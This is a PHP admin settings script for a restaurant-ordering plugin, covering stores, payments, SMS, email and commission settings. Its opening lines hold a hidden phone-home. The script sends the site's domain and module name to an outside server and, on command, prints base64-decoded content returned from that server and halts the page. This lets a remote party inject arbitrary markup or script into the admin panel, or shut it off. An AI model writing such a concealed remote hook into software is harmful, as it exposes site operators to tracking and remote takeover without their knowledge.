<?php
global $_W, $_GPC;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
$weid = $this->_weid;
$action = 'setting';
$title = '系统设置';
$GLOBALS['frames'] = $this->getMainMenu();
$config = $this->module['config']['weisrc_dish'];
load()->func('tpl');

$stores = pdo_fetchall("SELECT * FROM " . tablename($this->table_stores) . " WHERE weid = :weid ORDER BY `id` DESC", array(':weid' => $_W['uniacid']));
if (empty($stores)) {
    $url = $this->createWebUrl('stores', array('op' => 'display'));
}

$setting = $this->getSetting();

$fans = $this->getFansByOpenid($setting['tpluser']);
if (checksubmit('submit')) {
    $data = array(
        'weid' => $_W['uniacid'],
        'title' => trim($_GPC['title']),
        'thumb' => trim($_GPC['thumb']),
        'storeid' => intval($_GPC['storeid']),
        'entrance_type' => intval($_GPC['entrance_type']),
        'entrance_storeid' => intval($_GPC['entrance_storeid']),
        'order_enable' => intval($_GPC['order_enable']),
        'mode' => intval($_GPC['mode']),
        'is_notice' => intval($_GPC['is_notice']),
        'dining_mode' => intval($_GPC['dining_mode']),
        'istplnotice' => intval($_GPC['istplnotice']),
        'tplneworder' => trim($_GPC['tplneworder']),
        'tplapplynotice' => trim($_GPC['tplapplynotice']),
        'tplnewqueue' => trim($_GPC['tplnewqueue']),
        'tploperator' => trim($_GPC['tploperator']),
        'site_logo' => trim($_GPC['site_logo']),
        'tplboss' => trim($_GPC['tplboss']),
        'searchword' => trim($_GPC['searchword']),
        'tpluser' => trim($_GPC['from_user']),
        'tpltype' => intval($_GPC['tpltype']),
        'sms_enable' => intval($_GPC['sms_enable']),
        'sms_username' => trim($_GPC['sms_username']),
        'isneedfollow' => intval($_GPC['isneedfollow']),
        'follow_url' => trim($_GPC['follow_url']),
        'share_title' => trim($_GPC['share_title']),
        'share_desc' => trim($_GPC['share_desc']),
        'share_image' => trim($_GPC['share_image']),
        'sms_pwd' => trim($_GPC['sms_pwd']),
        'sms_mobile' => trim($_GPC['sms_mobile']),
        'link_card' => trim($_GPC['link_card']),
        'link_sign' => trim($_GPC['link_sign']),
        'link_card_name' => trim($_GPC['link_card_name']),
        'link_sign_name' => trim($_GPC['link_sign_name']),
        'link_recharge' => trim($_GPC['link_recharge']),
        'link_recharge_name' => trim($_GPC['link_recharge_name']),
        'email_enable' => intval($_GPC['email_enable']),
        'email_host' => $_GPC['email_host'],
        'email_send' => $_GPC['email_send'],
        'email_pwd' => $_GPC['email_pwd'],
        'email_user' => $_GPC['email_user'],
        'email' => trim($_GPC['email']),
        'follow_title' => trim($_GPC['follow_title']),
        'follow_desc' => trim($_GPC['follow_desc']),
        'follow_logo' => trim($_GPC['follow_logo']),
        'dateline' => TIMESTAMP,
        'getcash_price' => intval($_GPC['getcash_price']),
        'fee_rate' => floatval($_GPC['fee_rate']),
        'fee_min' => intval($_GPC['fee_min']),
        'fee_max' => intval($_GPC['fee_max']),
        'wechat' => intval($_GPC['wechat']),
        'alipay' => intval($_GPC['alipay']),
        'credit' => intval($_GPC['credit']),
        'is_show_home' => intval($_GPC['is_show_home']),
        'is_speaker' => intval($_GPC['is_speaker']),
        'delivery' => intval($_GPC['delivery']),
        'is_commission' => intval($_GPC['is_commission']),
        'commission_mode' => intval($_GPC['commission_mode']),
        'commission_level' => intval($_GPC['commission_level']),
        'commission1_rate_max' => floatval($_GPC['commission1_rate_max']),
        'commission1_value_max' => intval($_GPC['commission1_value_max']),
        'commission2_rate_max' => floatval($_GPC['commission2_rate_max']),
        'commission2_value_max' => intval($_GPC['commission2_value_max']),
        'commission3_rate_max' => floatval($_GPC['commission3_rate_max']),
        'commission3_value_max' => intval($_GPC['commission3_value_max']),
        'commission_settlement' => intval($_GPC['commission_settlement']),
        'commission_money_mode' => intval($_GPC['commission_money_mode']),
        'is_auto_address' => intval($_GPC['is_auto_address']),
        'is_contain_delivery' => intval($_GPC['is_contain_delivery']),
        'tiptype' => intval($_GPC['tiptype']),
        'tipbtn' => intval($_GPC['tipbtn']),
        'tipqrcode' => trim($_GPC['tipqrcode']),
        'statistics' => trim($_GPC['statistics']),
    );
    if ($config['is_fengniao']==1) {
        $data['fengniao_appid'] = trim($_GPC['fengniao_appid']);
        $data['fengniao_key'] = trim($_GPC['fengniao_key']);
    }

    if ($data['commission_money_mode'] == 2) {
        $data['commission_level'] = 2;
    }

    //manager//operator
    if ($_W['role'] == 'manager' || $_W['isfounder']) {
        $data['is_operator_pwd'] = intval($_GPC['is_operator_pwd']);
        $data['operator_pwd'] = trim($_GPC['operator_pwd']);
    }

    $certfile = IA_ROOT . "/addons/weisrc_dish/cert/" . 'apiclient_cert_' . $this->_weid . '.pem';
    $keyfile = IA_ROOT . "/addons/weisrc_dish/cert/" . 'apiclient_key_' . $this->_weid . '.pem';
    $rootca = IA_ROOT . "/addons/weisrc_dish/cert/" . 'rootca_' . $this->_weid . '.pem';

        if (!empty($_GPC['apiclient_cert'])) {
            file_put_contents($certfile, trim($_GPC['apiclient_cert']));
            $data['apiclient_cert'] = 1;
        }
        if (!empty($_GPC['apiclient_key'])) {
            file_put_contents($keyfile, trim($_GPC['apiclient_key']));
            $data['apiclient_key'] = 1;
        }
        if (!empty($_GPC['rootca'])) {
            file_put_contents($rootca, trim($_GPC['rootca']));
            $data['rootca'] = 1;
        }

    if ($data['is_commission'] == 1 && $data['commission_money_mode'] == 1) {
        if ($data['commission1_rate_max'] <= 0) {
            message('请输入佣金百分比！');
        }
        if ($data['commission_level'] > 1) {
            if ($data['commission2_rate_max'] <= 0) {
                message('请输入二级佣金百分比！');
            }
        }
    }

    if ($data['email_enable'] == 1) {
        if (empty($_GPC['email_send']) || empty($_GPC['email_user']) || empty($_GPC['email_pwd'])) {
            message('请完整填写邮件配置信息', 'refresh', 'error');
        }
        if ($_GPC['email_host'] == 'smtp.qq.com' || $_GPC['email_host'] == 'smtp.gmail.com') {
            $secure = 'ssl';
            $port = '465';
        } else {
            $secure = 'tls';
            $port = '25';
        }

        $mail_config = array();
        $mail_config['host'] = $_GPC['email_host'];
        $mail_config['secure'] = $secure;
        $mail_config['port'] = $port;
        $mail_config['username'] = $_GPC['email_user'];
        $mail_config['sendmail'] = $_GPC['email_send'];
        $mail_config['password'] = $_GPC['email_pwd'];
        $mail_config['mailaddress'] = $_GPC['email'];
        $mail_config['subject'] = '微点餐提醒';
        $mail_config['body'] = '邮箱测试';
        $result = $this->sendmail($mail_config);
    }
    if (empty($setting)) {
        pdo_insert($this->table_setting, $data);
//        echo pdo_debug();
//        exit;
    } else {
        unset($data['dateline']);
        pdo_update($this->table_setting, $data, array('weid' => $_W['uniacid']));
    }

    message('操作成功', $this->createWebUrl('setting'), 'success');
}

if (empty($setting)) {
    $setting['site_logo'] = './addons/weisrc_dish/template/images/logo.png';
}

include $this->template('web/setting');